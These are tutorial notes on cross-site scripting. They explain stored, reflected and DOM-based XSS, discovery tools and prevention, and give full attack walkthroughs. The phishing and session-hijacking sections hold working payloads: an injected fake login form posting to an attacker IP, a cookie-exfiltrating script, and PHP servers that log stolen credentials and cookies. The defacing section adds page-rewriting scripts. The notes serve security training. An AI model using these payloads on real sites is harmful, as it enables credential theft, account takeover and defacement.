# Cross-Site Scripting (XSS) — Complete Notes

---

## What is XSS?

Cross-Site Scripting (XSS) is a web vulnerability where an attacker injects malicious JavaScript code into a web page that other users then unknowingly execute in their browsers. A normal web application receives HTML from the server and renders it in the browser. When a vulnerable app does not sanitize user input, an attacker can sneak JavaScript into that HTML. When another user visits the same page, their browser sees the JavaScript as legitimate code and runs it — without the user doing anything wrong.

XSS is a **client-side** vulnerability, meaning it runs entirely in the victim's browser and does not directly attack the back-end server. Because of this, the direct damage to the server is low. However, XSS is extremely common in real web applications, which raises the overall risk to medium (low impact + high probability = medium risk). It should always be found and fixed.

---

## What Can XSS Do?

XSS can do anything that JavaScript can do inside a browser — which is quite a lot. Common XSS attacks include stealing session cookies to log in as the victim, redirecting users to phishing pages, capturing keystrokes, changing the visual content of a page, making API calls on behalf of the user (like changing their password), and even Bitcoin mining. In rare advanced cases, a skilled attacker can chain XSS with a browser exploit to break out of the browser sandbox and execute code on the victim's machine.

XSS is limited to the browser's JavaScript engine and, in modern browsers, is also restricted to the same domain as the vulnerable website. Even with these limits, the attack surface is huge because stealing one session cookie can give an attacker full account access without needing the victim's password.

---

## Real-World XSS Examples

The **Samy Worm** (2005) was a stored XSS attack on MySpace. It automatically posted "Samy is my hero" on any viewer's profile, and that post also contained the same XSS payload. Over one million users were infected in a single day — all without clicking anything unusual. In 2014, an XSS bug in Twitter's TweetDeck caused a tweet to retweet itself over 38,000 times in under two minutes, forcing Twitter to shut down TweetDeck temporarily. Even Google's search bar and Apache's web server have had XSS vulnerabilities discovered and exploited in recent years.

---

## Three Types of XSS

| Type | Where it runs | Stored? | How it reaches victim |
|---|---|---|---|
| Stored (Persistent) XSS | Server processes and stores it | Yes | Any user who visits the page |
| Reflected (Non-Persistent) XSS | Server processes but doesn't store it | No | Victim must click a crafted URL |
| DOM-based XSS | Runs entirely in browser JS, never sent to server | No | Victim must visit a crafted URL with a malicious parameter |

---

## Stored XSS (Persistent XSS)

Stored XSS is the most dangerous type because the malicious payload is **permanently saved in the database** and executes for every user who visits the affected page. The attacker injects JavaScript once (for example, into a comment box or a profile field), and it gets stored. Every future visitor unknowingly triggers the attack just by loading the page.

### How to Test for Stored XSS

Try this basic payload in any input field (comment box, username, profile bio, etc.):

```html
<script>alert(window.origin)</script>
```

`<script>` is the HTML tag that tells the browser "execute everything inside this as JavaScript." `alert(window.origin)` is the JavaScript function call that pops up a dialog box showing the current page's URL. We use `window.origin` instead of a static value like `1` because if the site uses iFrames (embedded pages from another domain), the alert will show exactly which domain is vulnerable.

If the alert pops up immediately after submitting, the payload executed. If the alert **also pops up when you refresh the page**, it confirms the XSS is stored in the database — a persistent vulnerability.

### Confirming in Page Source

Press `CTRL+U` to view raw page source. If you see your payload literally in the HTML like this, it means the server wrote your script directly into the page without sanitizing it:

```html
<ul><script>alert(window.origin)</script></ul>
```

### Alternative Test Payloads

Some browsers block `alert()` in certain contexts. Use these alternatives:

- `<plaintext>` — Stops HTML rendering after this tag; everything after shows as raw text. Very visible and easy to spot.
- `<script>print()</script>` — Opens the browser's print dialog. Almost never blocked by any browser.

---

## Reflected XSS (Non-Persistent XSS)

Reflected XSS happens when the server receives your input, uses it in the response HTML, and **sends it straight back to you** — without storing it anywhere. Common places this appears are error messages ("Task 'X' could not be added"), search results ("You searched for: X"), or confirmation messages. The payload is only active for that one page load and disappears on refresh — hence "non-persistent."

### How to Test for Reflected XSS

Submit the same basic payload into the input field:

```html
<script>alert(window.origin)</script>
```

If an alert pops up immediately after form submission, the input was reflected back to the browser as live HTML/JavaScript. Refresh the page — if the alert is gone, it is confirmed non-persistent/reflected.

You can also view page source (`CTRL+U`) to see something like:

```html
Task '<script>alert(window.origin)</script>' could not be added.
```

The server took your input and placed it directly inside an HTML string in the response, where the browser then parsed and executed the `<script>` block.

### How to Target Victims with Reflected XSS

Since the payload is not stored, victims must visit a specially crafted URL that contains the payload. Check the Network tab in Developer Tools (`CTRL+Shift+I → Network`). If the form sends a **GET request**, the input goes in the URL parameters. Copy that URL — it looks like:

```
http://TARGET/index.php?task=<script>alert(window.origin)</script>
```

Send this URL to a victim. When they click it, their browser loads the page, the server reflects the payload back, and the JavaScript executes in the victim's browser without them doing anything else. If the form uses POST, this direct URL trick does not work — you need to create a malicious HTML page that auto-submits a form.

---

## DOM-Based XSS — Detailed Explanation

DOM-based XSS is the most commonly misunderstood type, so this section explains it slowly and clearly. The key difference from Stored and Reflected XSS is this: **in DOM XSS, the server is never involved with the malicious input at all.** The JavaScript running in the browser reads the input and writes it to the page all by itself — entirely client-side.

### What is the DOM?

DOM stands for **Document Object Model**. When your browser loads an HTML page, it does not just show raw text — it builds an internal tree structure of every element on the page (headings, paragraphs, buttons, lists, etc.). This tree is the DOM. JavaScript can read and modify any part of this tree at any time. When JavaScript changes the DOM, the browser instantly updates what you see on screen — without loading a new page from the server.

Think of the HTML file as a blueprint and the DOM as the actual building. The server sends the blueprint. The browser constructs the building. JavaScript can renovate the building after it is built — and it does this by modifying the DOM.

### What is Source and Sink?

These two terms are essential for understanding DOM XSS:

**Source** = Where the attacker's input enters JavaScript. The source is any JavaScript object that reads user-controlled data. Common sources include:

- `document.URL` — the full current page URL
- `document.location` — the URL and its components
- `location.hash` — everything after the `#` symbol in the URL
- `location.search` — the query string (`?key=value`)
- `document.referrer` — the previous page URL

**Sink** = Where JavaScript writes that input into the DOM. The sink is any JavaScript function or property that actually puts data into the page. Common sinks include:

- `document.write()` — writes raw HTML directly to the page
- `element.innerHTML` — sets the inner HTML content of an element
- `element.outerHTML` — sets the element itself and its content
- jQuery functions: `add()`, `after()`, `append()`, `html()`

**The vulnerability happens when data flows from Source → Sink with no sanitization in between.** If what the user puts in the URL goes directly into `innerHTML` without any cleaning, the attacker controls what HTML (and therefore JavaScript) gets written to the page.

### Step-by-Step: How DOM XSS Works

Imagine this simple To-Do app. The page URL looks like:

```
http://example.com/#task=Buy milk
```

The JavaScript code in the page does this:

```javascript
// SOURCE: reads the URL and extracts whatever is after "task="
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// SINK: writes that value directly into the page HTML
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

**Line by line:**

`document.URL` is a JavaScript property that holds the full URL of the current page as a string, for example `http://example.com/#task=Buy milk`.

`document.URL.indexOf("task=")` searches through the URL string and returns the position (index number) where the text `"task="` begins. If `"task="` is found at position 30 in the URL, it returns `30`.

`document.URL.substring(pos + 5, document.URL.length)` cuts out a piece of the URL string. It starts at `pos + 5` (skipping past the 5 characters in `"task="`) and goes to the end of the URL. This leaves just the value — `Buy milk`.

`decodeURIComponent(task)` converts URL-encoded characters back to normal text. For example, `%20` becomes a space, `%3C` becomes `<`. This is important — it means even if an attacker URL-encodes their payload, it gets decoded before being placed in the DOM.

`document.getElementById("todo")` finds the HTML element with the id `"todo"` — this is a div or list item on the page.

`.innerHTML = "..."` sets the inner HTML of that element to the string provided. Whatever you put here is interpreted as raw HTML — including `<script>` tags, event handlers, and other executable content.

**Result:** Whatever the attacker puts in the `#task=` part of the URL gets written as raw HTML into the page. No server ever sees it.

### Why the Server Never Sees DOM XSS

Notice the URL uses a `#` symbol:

```
http://example.com/#task=<script>alert(1)</script>
```

The `#` symbol (called a hash or fragment identifier) is special in HTTP. Everything after `#` is **never sent to the server** — the browser strips it off before making the HTTP request. The server only receives `http://example.com/`. The browser keeps the `#task=...` part to itself and makes it available to JavaScript through `document.URL` or `location.hash`.

This is why DOM XSS is invisible to server-side protections. No server-side sanitization, WAF, or logging system ever sees the malicious payload. It lives and executes entirely in the browser.

### Confirming DOM XSS — What You Notice

When testing a page for DOM XSS, these are the clues:

1. **No network request is made** — Open Developer Tools → Network tab, add your test input, click the button. If no HTTP request appears in the network log, the processing is happening purely in JavaScript on the client side.

2. **The `#` symbol appears in the URL** — Input parameters passed via `#` are never sent to the server. This is a strong indicator of DOM-based processing.

3. **Page source (`CTRL+U`) does NOT show your input** — The HTML source the server sent does not contain your text, because the server never added it. Only the rendered page (which JavaScript modified after load) shows it.

4. **Web Inspector shows your input** — Press `CTRL+Shift+C` to open the element inspector. This shows the **live DOM** — what the page actually looks like after JavaScript ran. Here your input appears, because JavaScript wrote it in after the page loaded.

### The `#` Symbol — A Critical Detail

```
http://example.com/page.php?task=BuyMilk     ← Server sees: task=BuyMilk (Reflected XSS risk)
http://example.com/page.php#task=BuyMilk     ← Server sees: nothing after #  (DOM XSS territory)
```

When you see `#` in the URL before a parameter, it is a strong signal the application is using client-side JavaScript to read and display that value. Always check these `#` parameters for DOM XSS.

### DOM XSS Attack — The `innerHTML` Limitation

The most common sink `innerHTML` has one built-in protection: **it does not execute `<script>` tags**. If you inject:

```html
<script>alert(1)</script>
```

into `innerHTML`, the browser parses it as HTML but deliberately refuses to run `<script>` blocks inserted this way as a security feature. So this payload fails for DOM XSS via `innerHTML`.

### The Fix — Use Event Handler Payloads

Instead of `<script>` tags, use HTML elements with **event handler attributes** that execute JavaScript when something happens:

```html
<img src="" onerror=alert(window.origin)>
```

Breaking this down:

`<img>` creates an HTML image element. The browser tries to load the image from the `src` attribute.

`src=""` sets the image source to an empty string — meaning no valid image URL is provided.

`onerror=alert(window.origin)` is an event handler. When the browser tries to load the image and fails (which it always will, since the `src` is empty), it fires the `onerror` event and runs the JavaScript code assigned to it — `alert(window.origin)`.

This works through `innerHTML` because `<img>` is a valid HTML tag and `onerror` is a legitimate HTML attribute. The browser happily renders the `<img>` element, fails to load the image, and executes the `onerror` code. No `<script>` tag needed.

**To attack a victim with DOM XSS**, build the malicious URL and send it:

```
http://example.com/#task=<img src='' onerror=alert(window.origin)>
```

When the victim clicks this link, their browser loads the page, the JavaScript reads the `#task=` value, decodes it, and writes it into `innerHTML`. The `<img>` appears in the DOM, fails to load, and fires `onerror` — executing your JavaScript.

### Summary: DOM XSS vs Others

| Question | Stored XSS | Reflected XSS | DOM XSS |
|---|---|---|---|
| Does the server store the payload? | Yes | No | No |
| Does the server ever see the payload? | Yes | Yes | **No** |
| Is it persistent after refresh? | Yes | No | No |
| What processes the payload? | Server → Browser | Server → Browser | **Browser only** |
| Where does the `#` appear? | Doesn't apply | Doesn't apply | **In the URL** |
| Does page source show payload? | Yes | Yes | **No** |
| Does Web Inspector show payload? | Yes | Yes | **Yes (live DOM)** |
| Do `<script>` tags work in `innerHTML` sink? | Depends | Depends | **No — use `onerror`** |

---

## XSS Discovery

Finding XSS vulnerabilities is as important as exploiting them. There are three main approaches.

### 1. Automated Discovery with Tools

Automated scanners like Nessus, Burp Suite Pro, and OWASP ZAP can detect all three XSS types. They do this through two scan modes:

**Passive Scan** — Reviews the page's client-side JavaScript code without sending any attack payloads. Looks for dangerous patterns like `innerHTML` being fed unsanitized input (good for finding DOM XSS without touching the server).

**Active Scan** — Actually sends XSS payloads into every input field and URL parameter, then checks if the payload appears in the rendered page source. If the injected string appears unchanged, it may have executed.

Open-source tools include **XSS Strike**, **Brute XSS**, and **XSSer**. Install and use XSS Strike like this:

```bash
git clone https://github.com/s0md3v/XSStrike.git
```

`git clone` downloads the XSStrike tool from GitHub into a folder called `XSStrike` on your machine. This copies all the tool's files locally so you can run it.

```bash
cd XSStrike
```

`cd XSStrike` changes your terminal's current working directory into the XSStrike folder you just downloaded. You must be inside the folder to run the tool.

```bash
pip install -r requirements.txt
```

`pip install -r requirements.txt` uses Python's package manager `pip` to install all the Python libraries that XSStrike needs to run. The `-r requirements.txt` tells pip to read the list of dependencies from the `requirements.txt` file included in the tool.

```bash
python xsstrike.py -u "http://TARGET/index.php?task=test"
```

`python xsstrike.py` runs the main XSStrike script. `-u` specifies the target URL to scan. `?task=test` is the parameter being tested — XSStrike will try replacing `test` with various XSS payloads and check if any execute. It will report working payloads with an efficiency and confidence score.

> Even if automated tools find something, **always manually verify** — tools can produce false positives.

### 2. Manual Discovery with Payload Lists

Manually test XSS by pasting payloads from lists (like PayloadAllTheThings or Payload-Box) one by one into every input field. XSS is not limited to obvious input boxes — it can also work through HTTP headers like `Cookie` or `User-Agent` when their values are reflected back on the page.

Most payloads from lists will not work on any given target because they are written for different injection contexts (after a quote, inside an attribute, etc.) and different bypass techniques. Manual testing is time-consuming but teaches you a lot about how different injection contexts behave. For serious testing, writing a custom Python script to automate payload submission and compare responses is more efficient.

### 3. Code Review (Most Reliable)

Reading the application's actual source code — both front-end JavaScript and back-end PHP/Python/etc. — is the most accurate way to find XSS. You can trace exactly how user input flows from the form through the server and into the HTML response, and spot any point where sanitization is missing. For DOM XSS specifically, look for JavaScript that reads from `document.URL`, `location.hash`, or `location.search` and writes the result into `innerHTML`, `document.write()`, or any jQuery DOM method without sanitization in between.

---

## XSS Attacks — Defacing

Website defacing means changing what visitors see when they open a page. Attackers use stored XSS to inject JavaScript that rewrites the page content to display a message, usually to claim they hacked the site. Four JavaScript properties are commonly used for defacing:

| What to Change | JavaScript Property |
|---|---|
| Background color | `document.body.style.background` |
| Background image | `document.body.background` |
| Page title (browser tab) | `document.title` |
| Page body text | `element.innerHTML` |

### Change Background Color

```html
<script>document.body.style.background = "#141d2b"</script>
```

`document.body` refers to the entire `<body>` element of the HTML page — everything visible. `.style.background` accesses the CSS background style property of the body. Setting it to `"#141d2b"` changes the background to a very dark navy color (the Hack The Box background color). Once injected as stored XSS, this persists for every visitor and every page refresh.

### Change Background Image

```html
<script>document.body.background = "https://attacker.com/image.png"</script>
```

`.background` sets a background image URL instead of a color. The browser fetches and displays that image as the page background.

### Change Page Title

```html
<script>document.title = 'Hacked by XSS'</script>
```

`document.title` is a JavaScript property that directly controls the text shown in the browser tab and title bar. Changing this makes every visitor's tab show the attacker's chosen text.

### Replace All Page Content

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked!</h1>'</script>
```

`document.getElementsByTagName('body')` returns a collection of all `<body>` elements (there is always only one). `[0]` selects the first (and only) one. `.innerHTML = '...'` replaces everything inside the body with whatever HTML string you provide. This completely overwrites all visible page content with the attacker's HTML. This is the most destructive defacing technique because it removes all original content.

You can combine all three into a full defacing payload:

```html
<script>document.body.style.background="#141d2b"</script>
<script>document.title='Hacked'</script>
<script>document.getElementsByTagName('body')[0].innerHTML='<center><h1 style="color:white">You have been hacked</h1></center>'</script>
```

Each script tag in a stored XSS context gets saved separately in the database and executes in order when the page loads, progressively changing the background, title, and content.

---

## XSS Attacks — Phishing (Fake Login Form)

XSS phishing attacks inject a fake login form into a legitimate-looking page. The victim is on a real website they trust, but they see a login prompt that was actually injected by the attacker. When they enter their credentials, those credentials are sent to the attacker's server instead of the real site.

### Step 1 — Find the XSS Vulnerability

First, identify a working XSS payload. Test the basic `<script>alert(window.origin)</script>` and try different payloads if it fails. Review what the input looks like in the page source to understand the injection context.

### Step 2 — Build the Fake Login Form HTML

```html
<h3>Please login to continue</h3>
<form action=http://ATTACKER_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

`<form action=http://ATTACKER_IP>` creates an HTML form. The `action` attribute specifies where the form data is sent when submitted — here it goes to the attacker's server IP address. `<input type="password">` creates the password field; browsers automatically hide what the user types. When the victim clicks "Login", the browser sends a GET request to `http://ATTACKER_IP/?username=X&password=Y`.

### Step 3 — Inject with document.write()

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

`document.write()` is a JavaScript function that directly writes raw HTML into the current page at the point where it is called. Everything inside the parentheses is treated as HTML and rendered by the browser. This replaces or adds to the existing page content with the attacker's fake form — all triggered by the XSS payload.

### Step 4 — Remove the Original URL Input Field

If the original page still shows a URL input box, the fake login looks out of place. Remove it:

```javascript
document.getElementById('urlform').remove();
```

`document.getElementById('urlform')` finds the HTML element with the id `urlform` — the original image URL input form. `.remove()` deletes that element from the DOM entirely, so it disappears from the page. The victim sees only the fake login form, with no trace of the original URL field. Use browser Inspector (`CTRL+Shift+C`) to click on the element you want to remove and find its `id`.

### Step 5 — Comment Out Leftover HTML

After removing the form, leftover HTML fragments may still appear. Add an HTML comment at the end of your payload to hide them:

```html
...PAYLOAD... <!--
```

`<!--` is the opening tag of an HTML comment. Everything after `<!--` until the next `-->` is treated as a comment and not rendered. Since there is no closing `-->`, the browser treats all remaining HTML on the page as part of the comment — hiding any leftover original content and making the fake login look clean and legitimate.

### Step 6 — Catch the Credentials

Start a PHP server to capture credentials and redirect the victim:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```

`mkdir /tmp/tmpserver` creates a new folder called `tmpserver` inside `/tmp` (a temporary storage area in Linux). `cd /tmp/tmpserver` moves into that folder so any files you create are stored there.

Create `index.php`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_SERVER/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

`isset($_GET['username'])` checks if the `username` parameter exists in the incoming GET request. `fopen("creds.txt", "a+")` opens (or creates) a file called `creds.txt` in append mode — `"a+"` means add to the end of the file without deleting existing content. `fputs($file, "...")` writes the username and password to the file. `header("Location: ...")` sends an HTTP redirect to the victim's browser, bouncing them back to the original real website so they think the login worked. `fclose($file)` closes the file properly.

```bash
sudo php -S 0.0.0.0:80
```

`sudo php -S 0.0.0.0:80` starts a PHP built-in web server. `0.0.0.0` means listen on all network interfaces (accept connections from anywhere). Port `80` is the standard HTTP port. When the victim submits the fake login form, their browser sends the credentials to this server, the PHP script logs them, and redirects the victim back to the real site.

```bash
cat creds.txt
```

`cat creds.txt` prints the contents of the credentials file to the terminal. You will see captured credentials like: `Username: admin | Password: secret123`.

---

## XSS Attacks — Session Hijacking (Cookie Stealing)

Modern web applications use cookies to keep users logged in. Once a user logs in, the server gives their browser a session cookie. On every subsequent request, the browser automatically sends this cookie — the server uses it to recognize the user. If an attacker steals that cookie, they can send it in their own requests and the server thinks they are the victim — they are logged in as that person without ever knowing the password.

### Blind XSS

Session hijacking often involves **Blind XSS** — a situation where the XSS payload is submitted in a form (like a user registration, contact form, or support ticket) that is only viewed by an admin in a back-end panel you cannot access. You inject the payload, the admin opens the form in their panel, the JavaScript executes in their browser — and you steal their admin cookie.

Because you cannot see how the output looks, you need a payload that **phones home** to your server to confirm execution. You cannot just look for an alert box.

### Step 1 — Identify the Vulnerable Field

Use a remote script payload that reports back which field triggered it:

```html
<script src=http://ATTACKER_IP/fullname></script>
```

`<script src="URL">` is an HTML script tag that loads and executes an external JavaScript file from the specified URL. When the browser renders this, it makes an HTTP GET request to `http://ATTACKER_IP/fullname`. If you see this request arrive on your server, it means the `fullname` field executed your script — confirming that field is vulnerable. Change the path (`/fullname`, `/username`, `/website`) for each field you test so you know exactly which one triggered.

```bash
sudo php -S 0.0.0.0:80
```

Run this on your machine to start a listener before sending payloads. Every incoming request shows in the terminal. When you see a request like `GET /fullname HTTP/1.1`, you know the `fullname` field is vulnerable to XSS.

Try different payload formats because the injection context varies:

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
```

`'><script src=...` is used when the injection happens inside an HTML attribute value wrapped in single quotes — the `'` closes the attribute value, `>` closes the HTML tag, then `<script src=...>` begins the malicious script. `"><script src=...>` does the same but when the attribute uses double quotes. These payloads "break out" of the HTML context they are injected into before starting the script tag.

### Step 2 — Write the Cookie Stealing Script

Create `script.js` on your server:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

`new Image()` creates a new HTML image object in memory — no visible image appears on the page. `.src='...'` sets the source URL of that image. The browser immediately tries to load the image from that URL by making an HTTP GET request. `document.cookie` is a JavaScript property that returns all cookies associated with the current page as a string (e.g., `sessionid=abc123; user=admin`). Concatenating `document.cookie` to the URL sends the cookie as the `c` parameter in the request to your server. You receive the cookie as part of the URL in your server logs — without the victim noticing anything.

Why use an Image instead of `document.location`? Because `document.location` would navigate the victim's browser away from the page, which would be very obvious. Creating an invisible image in the background silently sends the cookie without any visible change.

### Step 3 — Inject the Script Loader

Use the confirmed working payload with your `script.js`:

```html
<script src=http://OUR_IP/script.js></script>
```

When the admin opens the vulnerable page, their browser requests `script.js` from your server. Your server delivers the cookie-stealing JavaScript. That JavaScript runs in the admin's browser, reads their cookie, and sends it back to your server as a URL parameter.

### Step 4 — Capture and Log Cookies

Save this as `index.php` on your server:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

`isset($_GET['c'])` checks if the `c` parameter (containing the cookie) arrived in the request. `explode(";", $_GET['c'])` splits the cookie string by semicolons — multiple cookies are separated by `;`, so this splits them into individual cookies. `foreach ($list as $key => $value)` loops through each individual cookie. `urldecode($value)` decodes URL-encoded characters back to readable text. `$_SERVER['REMOTE_ADDR']` gets the victim's IP address. The result is written to `cookies.txt` — one line per cookie, with the victim's IP.

```bash
cat cookies.txt
```

This shows all captured cookies:

```
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

### Step 5 — Use the Stolen Cookie to Log In

Open the target login page in your browser. Press `Shift+F9` in Firefox to open the Storage panel. Click the `+` button to add a new cookie. Set:
- **Name:** the part before `=` in the stolen cookie (e.g., `cookie`)
- **Value:** the part after `=` (e.g., `f904f93c949d19d870911bf8b05fe7b2`)

Refresh the page. The server receives your request with the stolen session cookie and treats you as the victim — you are now logged in as them, including any admin privileges they had, without ever knowing their password.

---

## XSS Prevention Summary

| Prevention Method | What it Does |
|---|---|
| Output Encoding | Convert `<`, `>`, `"`, `'` to HTML entities (`&lt;`, `&gt;`, etc.) before inserting user data into HTML |
| Input Sanitization | Strip or reject dangerous characters and HTML tags from user input on the server side |
| Content Security Policy (CSP) | HTTP header that tells the browser which scripts are allowed to run — blocks inline `<script>` tags |
| HttpOnly Cookie Flag | Marks cookies so JavaScript cannot read them (`document.cookie` returns empty) — prevents cookie theft via XSS |
| Use Safe DOM Methods | Use `textContent` or `innerText` instead of `innerHTML` when inserting user data — these never parse HTML |
| Validate Input | Check that input matches the expected format (e.g., only letters for a name field) and reject anything else |

The most important: never insert raw user input into HTML, JavaScript, or CSS. Always encode it first for the context it goes into.

---

*These notes cover all three XSS types in detail (with special focus on DOM XSS), discovery methods, and three full attack techniques: defacing, phishing, and session hijacking.*
